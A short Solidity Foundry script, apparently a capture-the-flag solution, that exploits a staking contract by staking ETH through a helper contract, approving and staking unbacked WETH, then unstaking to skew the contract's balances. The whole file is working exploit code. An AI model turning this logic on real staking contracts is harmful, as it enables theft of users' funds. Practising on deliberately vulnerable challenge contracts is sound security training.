// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.s.sol";

import {Script, console} from "forge-std/Script.sol";

contract StakeAttack is Broadcasted {
    function attack(address payable stakeCtr_) public payable override {
        address token = IStake(stakeCtr_).WETH();

        // stake some ether from other address
        new MyAtt{value: 0.001 ether + 2}(stakeCtr_);

        // stake 1 WETH ether
        IERC20(token).approve(stakeCtr_, type(uint256).max);
        IStake(stakeCtr_).StakeWETH(0.001 ether + 1);

        // unstake all my funds
        IStake(stakeCtr_).Unstake(0.001 ether + 1);
    }
}

contract MyAtt {
    constructor(address payable _stakeCtr) payable {
        IStake(_stakeCtr).StakeETH{value: msg.value}();
    }
}

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
}

interface IStake {
    function StakeETH() external payable;

    function StakeWETH(uint256 amount) external returns (bool);

    function Unstake(uint256 amount) external returns (bool);

    function WETH() external view returns (address);
}
